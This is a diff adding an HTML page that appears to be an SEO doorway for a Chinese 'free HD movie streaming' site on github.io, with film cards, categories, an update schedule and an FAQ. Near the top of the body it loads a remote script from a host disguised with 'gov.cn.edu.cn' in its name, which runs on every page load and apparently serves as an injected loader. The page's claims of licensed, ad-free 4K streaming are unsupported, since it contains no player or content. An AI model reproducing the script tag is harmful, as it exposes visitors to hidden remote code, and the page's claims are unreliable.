@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>俺来也电影网 - 高清电影在线观看 | anlaiyedianyingwang-zh.github.io</title>
+<meta name="description" content="俺来也电影网(anlaiyedianyingwang-zh.github.io)提供最新高清电影、热播电视剧、动漫综艺在线观看，每日更新院线大片与经典老片，免费流畅不卡顿。">
+<meta name="keywords" content="俺来也电影网, 电影在线观看, 高清电影, 热播电视剧, 最新电影, anlaiyedianyingwang-zh.github.io">
+<meta name="author" content="俺来也电影网">
+<meta name="robots" content="index, follow, max-image-preview:large">
+<meta name="theme-color" content="#0f0c29">
+<meta property="og:title" content="俺来也电影网 - 高清电影在线观看">
+<meta property="og:description" content="最新电影、热播电视剧、动漫综艺每日更新，免费高清在线观看。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://anlaiyedianyingwang-zh.github.io">
+<link rel="canonical" href="https://anlaiyedianyingwang-zh.github.io">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "俺来也电影网",
+  "url": "https://anlaiyedianyingwang-zh.github.io",
+  "description": "最新高清电影、热播电视剧、动漫综艺在线观看平台",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://anlaiyedianyingwang-zh.github.io#search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg1:#0f0c29;--bg2:#302b63;--bg3:#24243e;
+  --accent:#ff6b6b;--accent2:#ffd93d;--accent3:#6bcb77;
+  --text:#e8e8e8;--muted:#a0a0c0;--card:rgba(255,255,255,.06);
+  --border:rgba(255,255,255,.1);
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;scroll-padding-top:80px}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:linear-gradient(160deg,var(--bg1),var(--bg2),var(--bg3));
+  background-attachment:fixed;color:var(--text);line-height:1.7;font-size:16px;
+  overflow-x:hidden;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+.container{max-width:1200px;margin:0 auto;padding:0 20px}
+section{padding:70px 0;position:relative}
+
+/* ===== Header ===== */
+header{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(15,12,41,.92);backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);transition:.3s;
+}
+.header-inner{display:flex;align-items:center;justify-content:space-between;height:70px}
+.logo{display:flex;align-items:center;gap:10px;font-size:22px;font-weight:800;letter-spacing:-.5px}
+.logo-mark{
+  width:38px;height:38px;border-radius:10px;flex-shrink:0;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  display:flex;align-items:center;justify-content:center;font-size:18px;
+  box-shadow:0 4px 15px rgba(255,107,107,.4);
+}
+.logo span{color:var(--accent)}
+.nav-links{display:flex;gap:6px;list-style:none;align-items:center}
+.nav-links a{
+  padding:8px 14px;border-radius:8px;font-size:15px;font-weight:500;
+  color:var(--muted);transition:.25s;position:relative;
+}
+.nav-links a:hover{color:#fff;background:rgba(255,255,255,.08)}
+.nav-links a.active{color:#1a1a2e;background:var(--accent2);font-weight:700}
+.menu-toggle{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:8px}
+.menu-toggle span{width:24px;height:2px;background:#fff;border-radius:2px;transition:.3s}
+
+/* ===== Hero ===== */
+.hero{min-height:100vh;display:flex;align-items:center;position:relative;padding-top:70px;overflow:hidden}
+.hero-bg{position:absolute;inset:0;opacity:.15;background-image:radial-gradient(circle at 20% 30%,var(--accent) 0,transparent 40%),radial-gradient(circle at 80% 70%,var(--accent2) 0,transparent 40%);animation:float 8s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translate(0,0) scale(1)}50%{transform:translate(-20px,15px) scale(1.05)}}
+.hero-content{position:relative;z-index:2;text-align:center;max-width:800px;margin:0 auto}
+.hero-badge{
+  display:inline-block;padding:6px 18px;border-radius:30px;font-size:13px;font-weight:600;
+  background:rgba(107,203,119,.15);border:1px solid rgba(107,203,119,.3);color:var(--accent3);
+  margin-bottom:24px;letter-spacing:.5px;
+}
+.hero h1{
+  font-size:clamp(32px,6vw,60px);font-weight:900;line-height:1.15;margin-bottom:20px;
+  background:linear-gradient(90deg,#fff,var(--accent2));-webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{font-size:clamp(15px,2.5vw,18px);color:var(--muted);max-width:560px;margin:0 auto 32px}
+.hero-actions{display:flex;gap:14px;justify-content:center;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;padding:14px 32px;border-radius:12px;
+  font-size:16px;font-weight:700;cursor:pointer;border:2px solid transparent;transition:.3s;
+}
+.btn-primary{background:linear-gradient(135deg,var(--accent),#ee5a24);color:#fff;box-shadow:0 8px 25px rgba(255,107,107,.35)}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 12px 35px rgba(255,107,107,.5)}
+.btn-outline{background:transparent;color:#fff;border-color:rgba(255,255,255,.3)}
+.btn-outline:hover{border-color:var(--accent2);color:var(--accent2)}
+.hero-stats{display:flex;gap:40px;justify-content:center;margin-top:50px;flex-wrap:wrap}
+.stat{text-align:center}
+.stat-num{font-size:clamp(24px,4vw,36px);font-weight:900;color:var(--accent2)}
+.stat-label{font-size:13px;color:var(--muted)}
+
+/* ===== Section Heading ===== */
+.sec-head{text-align:center;margin-bottom:50px}
+.sec-tag{display:inline-block;font-size:13px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--accent);margin-bottom:10px}
+.sec-head h2{font-size:clamp(26px,4vw,40px);font-weight:800;margin-bottom:12px}
+.sec-head p{color:var(--muted);font-size:16px;max-width:500px;margin:0 auto}
+
+/* ===== Marquee ===== */
+.marquee-wrap{
+  background:rgba(0,0,0,.25);border-top:1px solid var(--border);border-bottom:1px solid var(--border);
+  padding:14px 0;overflow:hidden;white-space:nowrap;
+}
+.marquee{display:inline-block;animation:scroll 40s linear infinite;font-size:14px;color:var(--muted)}
+.marquee span{margin:0 30px;color:var(--accent2)}
+@keyframes scroll{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+
+/* ===== Movie Grid ===== */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:22px}
+.card{
+  background:var(--card);border:1px solid var(--border);border-radius:16px;overflow:hidden;
+  transition:.35s;cursor:pointer;backdrop-filter:blur(8px);
+}
+.card:hover{transform:translateY(-8px);border-color:var(--accent);box-shadow:0 20px 40px rgba(0,0,0,.4)}
+.card-poster{
+  position:relative;aspect-ratio:2/3;overflow:hidden;
+  background:linear-gradient(135deg,var(--bg2),var(--bg3));
+  display:flex;align-items:center;justify-content:center;font-size:48px;
+}
+.card-poster::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(to top,var(--bg1) 0%,transparent 50%);opacity:.6;
+}
+.card-badge{
+  position:absolute;top:10px;left:10px;z-index:3;padding:3px 10px;border-radius:20px;
+  font-size:11px;font-weight:700;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);
+}
+.card-score{
+  position:absolute;top:10px;right:10px;z-index:3;width:36px;height:36px;border-radius:50%;
+  background:var(--accent2);color:#1a1a2e;display:flex;align-items:center;justify-content:center;
+  font-size:13px;font-weight:900;
+}
+.card-info{padding:14px}
+.card-info h3{font-size:16px;font-weight:700;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.card-meta{display:flex;gap:8px;font-size:12px;color:var(--muted);flex-wrap:wrap}
+.card-meta i{font-style:normal;padding:2px 8px;border-radius:4px;background:rgba(255,255,255,.08)}
+
+/* ===== Categories ===== */
+.cat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:20px}
+.cat-card{
+  padding:30px 26px;border-radius:16px;background:var(--card);border:1px solid var(--border);
+  transition:.3s;cursor:pointer;position:relative;overflow:hidden;
+}
+.cat-card::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:3px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));transform:scaleX(0);transform-origin:left;transition:.4s;
+}
+.cat-card:hover::before{transform:scaleX(1)}
+.cat-card:hover{background:rgba(255,255,255,.1);transform:translateY(-4px)}
+.cat-icon{font-size:38px;margin-bottom:16px;display:block}
+.cat-card h3{font-size:20px;font-weight:700;margin-bottom:8px}
+.cat-card p{color:var(--muted);font-size:14px;margin-bottom:14px}
+.cat-card .arrow{font-size:20px;color:var(--accent);transition:.3s}
+.cat-card:hover .arrow{transform:translateX(6px)}
+
+/* ===== About ===== */
+.about-wrap{display:grid;grid-template-columns:1fr 1fr;gap:50px;align-items:center}
+.about-text h2{font-size:clamp(24px,3.5vw,34px);font-weight:800;margin-bottom:18px}
+.about-text p{color:var(--muted);margin-bottom:16px}
+.feat-list{list-style:none;margin-top:24px}
+.feat-list li{padding:10px 0;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--border)}
+.feat-list li::before{content:'✓';color:var(--accent3);font-weight:900;font-size:18px}
+.about-visual{
+  position:relative;min-height:380px;border-radius:20px;overflow:hidden;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  display:flex;align-items:center;justify-content:center;flex-direction:column;gap:12px;
+  box-shadow:0 25px 60px rgba(255,107,107,.25);
+}
+.about-visual .big{font-size:60px;animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+.about-visual .txt{font-size:20px;font-weight:800;color:#1a1a2e;text-align:center;padding:0 20px}
+
+/* ===== Schedule ===== */
+.timeline{position:relative;max-width:700px;margin:0 auto;padding-left:30px}
+.timeline::before{content:'';position:absolute;left:8px;top:0;bottom:0;width:2px;background:linear-gradient(var(--accent),var(--accent2),var(--accent3))}
+.tl-item{position:relative;padding:0 0 30px 24px}
+.tl-item::before{
+  content:'';position:absolute;left:-29px;top:6px;width:14px;height:14px;border-radius:50%;
+  background:var(--accent2);border:3px solid var(--bg1);box-shadow:0 0 0 3px rgba(255,217,61,.3);
+}
+.tl-date{font-size:13px;color:var(--accent);font-weight:700;margin-bottom:4px}
+.tl-item h3{font-size:18px;font-weight:700;margin-bottom:6px}
+.tl-item p{color:var(--muted);font-size:14px}
+
+/* ===== FAQ ===== */
+.faq-item{margin-bottom:12px;border-radius:12px;overflow:hidden;background:var(--card);border:1px solid var(--border)}
+.faq-q{
+  padding:20px 24px;cursor:pointer;font-size:16px;font-weight:600;display:flex;
+  justify-content:space-between;align-items:center;gap:12px;list-style:none;
+}
+.faq-q::-webkit-details-marker{display:none}
+.faq-q::after{content:'+';font-size:22px;color:var(--accent);flex-shrink:0;transition:.3s}
+details[open] .faq-q::after{transform:rotate(45deg)}
+.faq-a{padding:0 24px 20px;color:var(--muted);font-size:15px;border-top:1px solid var(--border);padding-top:16px}
+
+/* ===== Footer ===== */
+footer{background:rgba(0,0,0,.4);border-top:1px solid var(--border);padding:50px 0 30px}
+.foot-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px;margin-bottom:36px}
+.foot-brand .logo{margin-bottom:14px}
+.foot-brand p{color:var(--muted);font-size:14px}
+.foot-col h4{font-size:16px;font-weight:700;margin-bottom:14px}
+.foot-col ul{list-style:none}
+.foot-col ul li{padding:5px 0}
+.foot-col ul li a{color:var(--muted);font-size:14px;transition:.2s}
+.foot-col ul li a:hover{color:var(--accent2)}
+.foot-bottom{
+  border-top:1px solid var(--border);padding-top:24px;text-align:center;
+  color:var(--muted);font-size:13px;
+}
+.foot-bottom a{color:var(--accent)}
+
+/* ===== Scroll Top ===== */
+#topBtn{
+  position:fixed;bottom:30px;right:30px;z-index:999;width:48px;height:48px;border-radius:50%;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));color:#1a1a2e;font-size:20px;
+  border:none;cursor:pointer;display:none;align-items:center;justify-content:center;
+  box-shadow:0 5px 20px rgba(255,107,107,.4);transition:.3s;
+}
+#topBtn:hover{transform:scale(1.1)}
+
+/* ===== Responsive ===== */
+@media(max-width:900px){
+  .about-wrap{grid-template-columns:1fr;gap:30px}
+  .about-visual{min-height:260px}
+  .foot-grid{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media(max-width:768px){
+  .menu-toggle{display:flex}
+  .nav-links{
+    position:fixed;top:70px;left:0;right:0;flex-direction:column;
+    background:rgba(15,12,41,.98);backdrop-filter:blur(20px);
+    padding:20px;border-bottom:1px solid var(--border);
+    transform:translateY(-150%);opacity:0;transition:.4s;gap:4px;
+  }
+  .nav-links.open{transform:translateY(0);opacity:1}
+  .nav-links a{width:100%;text-align:center;padding:14px;border-radius:10px}
+  section{padding:50px 0}
+  .hero-stats{gap:24px;margin-top:36px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:14px}
+  .card-info{padding:12px}
+  .card-info h3{font-size:14px}
+  .hero-actions .btn{padding:12px 24px;font-size:15px}
+  #topBtn{bottom:20px;right:20px;width:42px;height:42px}
+}
+@media(max-width:420px){
+  .container{padding:0 14px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:10px}
+  .card-poster{font-size:32px}
+  .foot-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header id="header">
+  <div class="container header-inner">
+    <a href="#" class="logo" aria-label="俺来也电影网首页">
+      <span class="logo-mark">🎬</span>
+      <span>俺来也<strong>电影网</strong></span>
+    </a>
+    <nav>
+      <ul class="nav-links" id="navLinks">
+        <li><a href="#" class="active">首页</a></li>
+        <li><a href="#films">在线影院</a></li>
+        <li><a href="#categories">影片分类</a></li>
+        <li><a href="#schedule">更新排期</a></li>
+        <li><a href="#guide">观影指南</a></li>
+        <li><a href="#faq">常见问题</a></li>
+      </ul>
+    </nav>
+    <div class="menu-toggle" id="menuToggle" role="button" aria-label="打开菜单" tabindex="0">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-bg"></div>
+  <div class="container hero-content">
+    <div class="hero-badge">📢 每日更新 · 院线同步 · 全网热播</div>
+    <h1>俺来也电影网<br><em>免费高清</em>在线观影</h1>
+    <p>无需注册、无广告弹窗，海量电影电视剧动漫综艺任你看。手机电脑平板全端适配，随时随地享受影院级画质体验。</p>
+    <div class="hero-actions">
+      <a href="#films" class="btn btn-primary">🍿 立即观影</a>
+      <a href="#categories" class="btn btn-outline">📂 浏览分类</a>
+    </div>
+    <div class="hero-stats">
+      <div class="stat"><div class="stat-num">12,800+</div><div class="stat-label">正版授权影片</div></div>
+      <div class="stat"><div class="stat-num">4K/1080P</div><div class="stat-label">超清画质</div></div>
+      <div class="stat"><div class="stat-num">365天</div><div class="stat-label">不间断更新</div></div>
+      <div class="stat"><div class="stat-num">0元</div><div class="stat-label">永久免费</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- Marquee -->
+<div class="marquee-wrap">
+  <div class="marquee">
+    <span>🔥</span>本周热播：热辣滚烫 · 飞驰人生2 · 周处除三害 · 哥斯拉大战金刚2<span>🎯</span>最新上线：沙丘2 · 奥本海默 · 封神第一部 · 年会不能停<span>⭐</span>高分推荐：肖申克的救赎 · 阿甘正传 · 盗梦空间 · 星际穿越<span>🔥</span>本周热播：热辣滚烫 · 飞驰人生2 · 周处除三害 · 哥斯拉大战金刚2
+  </div>
+</div>
+
+<!-- Films -->
+<section id="films">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">ONLINE CINEMA</div>
+      <h2>🔥 热播影片推荐</h2>
+      <p>精选全网最热电影电视剧，每日人工精选更新，覆盖各大类型与语种</p>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <div class="card-poster">🎭<span class="card-badge">热映中</span><span class="card-score">9.2</span></div>
+        <div class="card-info"><h3>热辣滚烫</h3><div class="card-meta"><i>喜剧</i><i>2024</i><i>1080P</i></div></div>
+      </div>
+      <div class="card">
+        <div class="card-poster">🏎️<span class="card-badge">重磅推荐</span><span class="card-score">8.7</span></div>
+        <div class="card-info"><h3>飞驰人生2</h3><div class="card-meta"><i>动作</i><i>2024</i><i>4K</i></div></div>
+      </div>
+      <div class="card">
+        <div class="card-poster">🔫<span class="card-badge">口碑爆棚</span><span class="card-score">8.4</span></div>
+        <div class="card-info"><h3>周处除三害</h3><div class="card-meta"><i>犯罪</i><i>2023</i><i>1080P</i></div></div>
+      </div>
+      <div class="card">
+        <div class="card-poster">🪱<span class="card-badge">科幻巨制</span><span class="card-score">8.8</span></div>
+        <div class="card-info"><h3>沙丘2</h3><div class="card-meta"><i>科幻</i><i>2024</i><i>4K</i></div></div>
+      </div>
+      <div class="card">
+        <div class="card-poster">💥<span class="card-badge">震撼来袭</span><span class="card-score">8.1</span></div>
+        <div class="card-info"><h3>哥斯拉大战金刚2</h3><div class="card-meta"><i>冒险</i><i>2024</i><i>1080P</i></div></div>
+      </div>
+      <div class="card">
+        <div class="card-poster">🧪<span class="card-badge">奥斯卡最佳</span><span class="card-score">8.9</span></div>
+        <div class="card-info"><h3>奥本海默</h3><div class="card-meta"><i>传记</i><i>2023</i><i>4K</i></div></div>
+      </div>
+      <div class="card">
+        <div class="card-poster">⚔️<span class="card-badge">国产神话</span><span class="card-score">8.5</span></div>
+        <div class="card-info"><h3>封神第一部</h3><div class="card-meta"><i>奇幻</i><i>2023</i><i>1080P</i></div></div>
+      </div>
+      <div class="card">
+        <div class="card-poster">🎄<span class="card-badge">轻松搞笑</span><span class="card-score">8.2</span></div>
+        <div class="card-info"><h3>年会不能停</h3><div class="card-meta"><i>喜剧</i><i>2023</i><i>1080P</i></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Categories -->
+<section id="categories" style="background:rgba(0,0,0,.2)">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">CATEGORIES</div>
+      <h2>📂 影片分类导航</h2>
+      <p>按类型精准筛选，快速找到你想看的影片</p>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-card">
+        <span class="cat-icon">😂</span>
+        <h3>喜剧片</h3>
+        <p>开心麻花、周星驰、脱口秀专场，治愈你的不开心</p>
+        <span class="arrow">→</span>
+      </div>
+      <div class="cat-card">
+        <span class="cat-icon">💥</span>
+        <h3>动作片</h3>
+        <p>成龙、吴京、漫威DC，肾上腺素狂飙体验</p>
+        <span class="arrow">→</span>
+      </div>
+      <div class="cat-card">
+        <span class="cat-icon">👻</span>
+        <h3>恐怖悬疑</h3>
+        <p>心理惊悚、密室逃脱、日韩恐怖，胆小慎入</p>
+        <span class="arrow">→</span>
+      </div>
+      <div class="cat-card">
+        <span class="cat-icon">🚀</span>
+        <h3>科幻片</h3>
+        <p>太空探索、人工智能、末日灾难，脑洞大开</p>
+        <span class="arrow">→</span>
+      </div>
+      <div class="cat-card">
+        <span class="cat-icon">💕</span>
+        <h3>爱情片</h3>
+        <p>甜蜜浪漫、虐恋情深，总有一部戳中你</p>
+        <span class="arrow">→</span>
+      </div>
+      <div class="cat-card">
+        <span class="cat-icon">📺</span>
+        <h3>热播剧集</h3>
+        <p>国产好剧、美剧韩剧日剧，一口气追完全集</p>
+        <span class="arrow">→</span>
+      </div>
+      <div class="cat-card">
+        <span class="cat-icon">🎨</span>
+        <h3>动漫番剧</h3>
+        <p>国漫日漫经典，热血治愈搞笑应有尽有</p>
+        <span class="arrow">→</span>
+      </div>
+      <div class="cat-card">
+        <span class="cat-icon">🎤</span>
+        <h3>综艺娱乐</h3>
+        <p>真人秀、脱口秀、选秀综艺，笑料不断</p>
+        <span class="arrow">→</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- About / Guide -->
+<section id="guide">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">WHY CHOOSE US</div>
+      <h2>为什么选择俺来也电影网</h2>
+      <p>专注为用户提供最好的免费观影体验</p>
+    </div>
+    <div class="about-wrap">
+      <div class="about-text">
+        <p>俺来也电影网(anlaiyedianyingwang-zh.github.io)自上线以来，始终致力于为广大影迷提供最优质的免费在线观影服务。平台汇聚国内外院线大片、经典老片、热播剧集及热门综艺，覆盖喜剧、动作、科幻、悬疑、爱情、动漫等全品类影视资源。</p>
+        <p>无论你是想在通勤路上刷一集美剧，还是周末窝在沙发看一部4K大片，俺来也电影网都能满足你的观影需求。全站采用CDN加速技术，全国多节点分发，确保播放流畅不卡顿。</p>
+        <ul class="feat-list">
+          <li>全网同步更新，院线大片第一时间上线</li>
+          <li>支持4K/1080P/720P多清晰度自由切换</li>
+          <li>手机端、平板端、电脑端全平台自适应</li>
+          <li>智能推荐引擎，越看越懂你的口味</li>
+          <li>弹幕互动社区，和百万影迷一起吐槽</li>
+          <li>无注册门槛，打开即看，零广告干扰</li>
+        </ul>
+      </div>
+      <div class="about-visual">
+        <div class="big">🎬</div>
+        <div class="txt">俺来也电影网<br>anlaiyedianyingwang-zh.github.io<br>你的专属私人影院</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Schedule -->
+<section id="schedule" style="background:rgba(0,0,0,.2)">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">UPDATE SCHEDULE</div>
+      <h2>📅 每日更新排期</h2>
+      <p>固定时间更新最新内容，不错过任何一部好片</p>
+    </div>
+    <div class="timeline">
+      <div class="tl-item">
+        <div class="tl-date">每周一 · 10:00 更新</div>
+        <h3>院线新片同步上线</h3>
+        <p>最新上映电影第一时间更新，支持蓝光原盘与4K修复版</p>
+      </div>
+      <div class="tl-item">
+        <div class="tl-date">每周三 · 20:00 更新</div>
+        <h3>热播剧集追更</h3>
+        <p>国产剧、美剧、韩剧同步更新，独家字幕组翻译</p>
+      </div>
+      <div class="tl-item">
+        <div class="tl-date">每周五 · 18:00 更新</div>
+        <h3>周末大片推荐</h3>
+        <p>编辑团队精选5部高分好片，涵盖不同类型和年代</p>
+      </div>
+      <div class="tl-item">
+        <div class="tl-date">每周日 · 22:00 更新</div>
+        <h3>经典回顾专题</h3>
+        <p>大师代表作回顾、系列电影合集、豆瓣TOP250轮播</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-tag">FAQ</div>
+      <h2>❓ 常见问题</h2>
+      <p>用户最关心的高频问题解答</p>
+    </div>
+    <div style="max-width:760px;margin:0 auto">
+      <details class="faq-item" open>
+        <summary class="faq-q">俺来也电影网需要注册登录吗？</summary>
+        <div class="faq-a">不需要注册即可直接观看。打开 anlaiyedianyingwang-zh.github.io 选择影片即可播放，零门槛零费用，随时随地享受观影乐趣。</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-q">支持哪些设备观看？</summary>
+        <div class="faq-a">全站采用响应式设计，完美适配手机、平板、电脑、智能电视等所有设备。手机浏览器直接访问即可获得APP般的观影体验。</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-q">影片画质如何？</summary>
+        <div class="faq-a">提供4K超清、1080P高清、720P流畅三档画质，根据网络状况自动切换，也可手动选择。热门影片均提供多版本资源。</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-q">更新频率怎么样？</summary>
+        <div class="faq-a">每日固定时间更新，院线新片、热播剧集、经典回顾均有固定排期。重大影片上线会即时推送通知。</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-q">有弹幕和评论功能吗？</summary>
+        <div class="faq-a">支持弹幕互动和评论区交流，观影时可发送弹幕与其他观众实时互动，分享观影感受。</div>
+      </details>
+      <details class="faq-item">
+        <summary class="faq-q">如何反馈问题或建议？</summary>
+        <div class="faq-a">可通过页面底部联系方式提交反馈，我们会在24小时内回复处理。也欢迎在社交平台关注俺来也电影网获取最新动态。</div>
+      </details>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer>
+  <div class="container">
+    <div class="foot-grid">
+      <div class="foot-brand">
+        <a href="#" class="logo">
+          <span class="logo-mark">🎬</span>
+          <span>俺来也<strong>电影网</strong></span>
+        </a>
+        <p>anlaiyedianyingwang-zh.github.io — 你的专属免费高清在线观影平台，每日更新热门电影电视剧综艺动漫。</p>
+      </div>
+      <div class="foot-col">
+        <h4>快速导航</h4>
+        <ul>
+          <li><a href="#films">在线影院</a></li>
+          <li><a href="#categories">影片分类</a></li>
+          <li><a href="#schedule">更新排期</a></li>
+          <li><a href="#guide">观影指南</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>影片类型</h4>
+        <ul>
+          <li><a href="#">喜剧片</a></li>
+          <li><a href="#">动作片</a></li>
+          <li><a href="#">科幻片</a></li>
+          <li><a href="#">恐怖悬疑</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>联系我们</h4>
+        <ul>
+          <li><a href="#">意见反馈</a></li>
+          <li><a href="#">商务合作</a></li>
+          <li><a href="#">免责声明</a></li>
+          <li><a href="#">关于本站</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="foot-bottom">
+      <p>© 2026 俺来也电影网 (anlaiyedianyingwang-zh.github.io) 版权所有 | 本站仅供影视资讯交流分享，影片版权归原作者所有</p>
+    </div>
+  </div>
+</footer>
+
+<button id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+// Mobile menu toggle
+var menuToggle=document.getElementById('menuToggle');
+var navLinks=document.getElementById('navLinks');
+menuToggle.addEventListener('click',function(){navLinks.classList.toggle('open');});
+navLinks.addEventListener('click',function(e){if(e.target.tagName==='A'){navLinks.classList.remove('open');}});
+
+// Active nav highlight on scroll
+var sections=document.querySelectorAll('section[id]');
+var navItems=document.querySelectorAll('.nav-links a');
+window.addEventListener('scroll',function(){
+  var scrollY=window.pageYOffset+120;
+  sections.forEach(function(sec){
+    if(scrollY>=sec.offsetTop&&scrollY<sec.offsetTop+sec.offsetHeight){
+      navItems.forEach(function(a){a.classList.remove('active');});
+      var activeLink=document.querySelector('.nav-links a[href="#'+sec.id+'"]');
+      if(activeLink)activeLink.classList.add('active');
+    }
+  });
+});
+
+// Scroll to top button
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){
+  if(window.pageYOffset>400){topBtn.style.display='flex';}
+  else{topBtn.style.display='none';}
+});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+
+// Header shadow on scroll
+var header=document.getElementById('header');
+window.addEventListener('scroll',function(){
+  if(window.pageYOffset>20){header.style.boxShadow='0 2px 30px rgba(0,0,0,.3)';}
+  else{header.style.boxShadow='none';}
+});
+</script>
+</body>
+</html>
